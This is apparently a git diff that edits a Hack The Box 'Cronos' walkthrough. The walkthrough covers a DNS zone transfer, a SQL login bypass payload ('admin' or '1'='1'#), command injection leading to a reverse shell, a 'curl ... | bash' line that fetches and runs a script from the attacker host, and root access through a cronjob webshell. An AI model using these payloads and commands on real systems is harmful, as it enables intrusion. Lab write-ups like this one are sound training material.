@@ -17,10 +17,12 @@ Above command runs nmap with default scripts `-sC`, version detection `-sV` and 
 <br/>
 
 The scan gives the following output:
+
 ![Nmap Image](./images/cronos_nmap.png)
 
 We have services running on port 22, 53 and 80. We'll check them in detail.
 
+<br/>
 First, lets check the website running on port 80. 
 
 ![](./images/cronos_apacheDefault.png)
@@ -29,14 +31,14 @@ It just gives us a default Apache page. I tried gobuster on it but found no dire
 
 <br/>
 
-Then i turned my attention to port 53, I had no idea about <span id=yellow>ISC BIND service</span>. Searching the internet provided some information.<br/>
+Then we turn our attention to port 53, I had no idea about <span id=yellow>ISC BIND service</span>. Searching the internet provided some information.<br/>
 Below is a simple description:
 > BIND (Berkeley Internet Name Domain) is an open source software that enables you to publish your Domain Name System (DNS) information on the Internet, and to resolve DNS
 queries for your users.
 
-Then i looked at `searchsploit` for known any exploits for it, spent some time with the exploits that came up, but none of them worked.
+Next, Looked at `searchsploit` for any known exploits, spent some time trying them, but none of them worked.
 
-After a while i queried the server for its <u>reverse DNS record</u>, i used below command
+After a while i queried the server for its <u>reverse DNS record</u>, i used below command:<br/>
     `dig @10.10.10.13 -x 10.10.10.13`<br/>
 
 Below we can see, that the server responded:
@@ -48,7 +50,7 @@ Now, we have new domains. So i added <span id=yellow>ns1.cronos.htb</span> and <
 Visiting cronos.htb and ns1.cronos.htb provided with a simple webpage created using Laravel and no further directories were revealed with gobuster .
 So this seemed like a dead end. :(
 
-
+<br/>
 Now, since this is a DNS Server, it tried to do <u>zone transfer</u> and it worked. See below:
 
 ![](./images/cronos_dig.png)
@@ -60,7 +62,7 @@ Now i visited admin.cronos.htb and was greeted with a login form as shown below
 ![](./images/cronos_adminpanel.png)
 
 <br/>
-I tried basic payloads and got in with a simple SQL authentication bypass payload:<br/>
+Tried some basic payloads and got in with a simple SQL authentication bypass payload:<br/>
     `admin' or '1'='1'#`  or  `admin' #`     worked for me.
     
 We can see the request in Burp for the same
@@ -71,6 +73,7 @@ We can see the request in Burp for the same
 After the bypass it redirected me to a simple webpage, where two commands  `traceroute` and `ping` could be executed. 
 
 I verified if i could ping my machine, below we can see `tcpdump` capturing ping request coming to our machine.
+
 ![](./images/cronos_cmdexecution.png)
 
 Next, it was only natural to try to see if i could get <span id=green>command execution here</span>.<br/>
@@ -87,20 +90,21 @@ Perl reverse shell Payload used above:
 <br/>
 
 Below we can see, we get a session on our local machine <span id=green>:)</span>
+
 ![](./images/cronos_rshell1.png)
 
 Now, we have session to server. we see a home directory of user `noulis` and there we get our `user.txt` <span id=green>flag</span>.
 
-Next task: Priveldge escalation.
+Next task: Privilege escalation.
 <br/>
 <br/>
 
-## Priveledge Escalaiton
+## Privilege Escalaiton
 
 Make a local python server and upload the `linEnum.sh` script.<br/>
 
   Start a local python server  : `$ python -m SimpleHTTPServer 8181`<br/>
-  Download and run on attacker : `$ curl http://10.10.14.7/linEnum.sh | bash`
+  Run this script on Server   : `$ curl http://10.10.14.7/linEnum.sh | bash`
   
 ![](./images/cronos_linEnum1.png)
 
@@ -124,11 +128,14 @@ Below is detail of steps performed to upload PHP webshell
 
 <br/>
 Meanwhile, we set up a listener at port `4445`, and wait for shell to execute via cronjob.<br/>
-After a minute, go the session and can read the root flag :)
+After a minute, got the session and we are root :)
 
 ![](./images/cronos_root.png)
 
+<br/>
 <span id=green>Cronos is Owned!!!</span>
 
 
+<br/>
 
+[<< Back](https://grey-fish.github.io/HTB/index.html)
